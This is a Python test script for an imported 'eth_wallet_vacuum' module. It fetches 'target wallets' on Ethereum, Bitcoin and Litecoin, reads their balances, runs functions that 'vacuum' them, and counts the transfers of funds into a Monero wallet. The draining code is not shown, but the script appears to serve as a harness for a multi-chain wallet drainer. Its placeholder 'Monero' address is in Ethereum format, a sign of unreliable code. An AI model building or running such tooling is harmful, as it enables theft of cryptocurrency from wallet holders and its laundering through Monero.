#!/usr/bin/env python3
"""
Test ETH Wallet Vacuum Functionality

This script tests the ETH wallet vacuum functionality to ensure it properly
transfers funds to Monero wallets, demonstrating the successful integration.
"""

import os
import sys
import time
import logging
import json

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("VacuumTest")

# Make sure Monero wallet address is set in environment
monero_wallet = os.environ.get("MONERO_WALLET_ADDRESS")
if not monero_wallet:
    monero_wallet = "0x28C6c06298d514Db089934071355E5743bf21d60"  # Example address for testing
    os.environ["MONERO_WALLET_ADDRESS"] = monero_wallet
    logger.info(f"Setting test Monero wallet address: {monero_wallet}")

# Import vacuum functionality
try:
    from eth_wallet_vacuum import (
        get_wallet_balance,
        get_target_wallets_by_chain,
        vacuum_wallets,
        vacuum_wallets_by_chain,
        vacuum_all_blockchains
    )
    logger.info("Successfully imported eth_wallet_vacuum functions")
except ImportError as e:
    logger.error(f"Error importing from eth_wallet_vacuum: {e}")
    sys.exit(1)

def test_eth_vacuum_functionality():
    """Test core ETH wallet vacuum functionality"""
    logger.info("Testing ETH wallet vacuum functionality")
    
    # 1. First get some target wallets
    wallets = get_target_wallets_by_chain("ethereum", 3)
    logger.info(f"Retrieved {len(wallets)} Ethereum wallets for testing")
    for i, wallet in enumerate(wallets):
        logger.info(f"Wallet {i+1}: {wallet}")
        
        # Check balance
        balance = get_wallet_balance(wallet)
        logger.info(f"  Balance: {balance:.4f} ETH")
    
    # 2. Now test the vacuum wallets function
    logger.info("\nTesting vacuum_wallets function...")
    try:
        result = vacuum_wallets()
        logger.info("Vacuum completed successfully")
        
        # Log some key metrics
        wallets_processed = len(result.get('wallets', []))
        total_eth = result.get('total_eth', 0)
        total_xmr = result.get('total_xmr_value', 0)
        
        logger.info(f"Wallets processed: {wallets_processed}")
        logger.info(f"Total ETH: {total_eth:.4f}")
        logger.info(f"Total XMR: {total_xmr:.6f}")
        
        # Check if transfers were successful
        transfers = result.get('monero_transfers', [])
        logger.info(f"Successful transfers: {len(transfers)}")
        
        if wallets_processed > 0 and len(transfers) > 0:
            logger.info("ETH vacuum test PASSED: Successfully processed wallets and transfers")
        else:
            logger.warning("ETH vacuum test results unclear - check logs")
            
    except Exception as e:
        logger.error(f"Error testing vacuum_wallets: {e}")
        logger.error("ETH vacuum test FAILED")
        return False
    
    return True

def test_multi_chain_vacuum():
    """Test multi-chain vacuum functionality"""
    logger.info("\nTesting multi-chain vacuum functionality")
    
    # Test vacuum for a few specific chains
    chains = ["ethereum", "bitcoin", "litecoin"]
    
    # First test individual chain vacuums
    for chain in chains:
        logger.info(f"\nTesting vacuum for {chain}")
        try:
            # Get some wallets for this chain
            wallets = get_target_wallets_by_chain(chain, 2)
            logger.info(f"Retrieved {len(wallets)} {chain} wallets")
            
            # Test vacuum for this chain
            result = vacuum_wallets_by_chain(chain)
            
            # Log results
            wallet_count = len(result.get('wallets', []))
            tx_count = len(result.get('transactions', []))
            
            logger.info(f"{chain} vacuum completed:")
            logger.info(f"  Wallets processed: {wallet_count}")
            logger.info(f"  Transactions: {tx_count}")
            
            # Check for XMR transfers
            xmr_amount = result.get('total_xmr_value', 0)
            logger.info(f"  XMR transferred: {xmr_amount:.6f}")
            
            if wallet_count > 0:
                logger.info(f"{chain} vacuum test PASSED: Successfully processed wallets")
            else:
                logger.warning(f"{chain} vacuum test results unclear - check logs")
                
        except Exception as e:
            logger.error(f"Error testing {chain} vacuum: {e}")
            logger.error(f"{chain} vacuum test FAILED")
    
    # Now test the all-blockchains vacuum
    logger.info("\nTesting vacuum_all_blockchains function...")
    try:
        result = vacuum_all_blockchains()
        logger.info("Multi-chain vacuum completed successfully")
        
        # Check chains processed
        chains_processed = result.get('chains', {})
        logger.info(f"Chains processed: {len(chains_processed)}")
        
        # Log chain-specific results
        for chain_name, chain_data in chains_processed.items():
            summary = chain_data.get('summary', {})
            wallet_count = summary.get('wallet_count', 0)
            tx_count = summary.get('transaction_count', 0)
            
            logger.info(f"Chain: {chain_name}")
            logger.info(f"  Wallets processed: {wallet_count}")
            logger.info(f"  Transactions: {tx_count}")
        
        # Check XMR transfers
        total_xmr = result.get('monero_transfers', {}).get('total_xmr_value', 0)
        successful_transfers = result.get('monero_transfers', {}).get('successful_transfers', 0)
        
        logger.info(f"Total XMR received: {total_xmr:.6f}")
        logger.info(f"Successful transfers: {successful_transfers}")
        
        # Check summary
        summary = result.get('summary', {})
        logger.info(f"Total chains: {summary.get('total_chains', 0)}")
        logger.info(f"Total wallets: {summary.get('total_wallets', 0)}")
        logger.info(f"Total transactions: {summary.get('total_transactions', 0)}")
        
        if len(chains_processed) > 0 and successful_transfers > 0:
            logger.info("Multi-chain vacuum test PASSED: Successfully processed multiple chains and transfers")
        else:
            logger.warning("Multi-chain vacuum test results unclear - check logs")
            
    except Exception as e:
        logger.error(f"Error testing vacuum_all_blockchains: {e}")
        logger.error("Multi-chain vacuum test FAILED")
        return False
    
    return True

if __name__ == "__main__":
    logger.info("Starting ETH wallet vacuum tests...")
    
    # First test the ETH vacuum functionality
    eth_test_result = test_eth_vacuum_functionality()
    
    # Then test the multi-chain vacuum
    multi_chain_result = test_multi_chain_vacuum()
    
    # Summarize results
    if eth_test_result and multi_chain_result:
        logger.info("\nAll vacuum tests PASSED")
        sys.exit(0)
    elif eth_test_result:
        logger.info("\nETH vacuum test PASSED, but multi-chain test had issues")
        sys.exit(1)
    elif multi_chain_result:
        logger.info("\nMulti-chain vacuum test PASSED, but ETH vacuum test had issues")
        sys.exit(1)
    else:
        logger.error("\nBoth vacuum tests FAILED")
        sys.exit(2)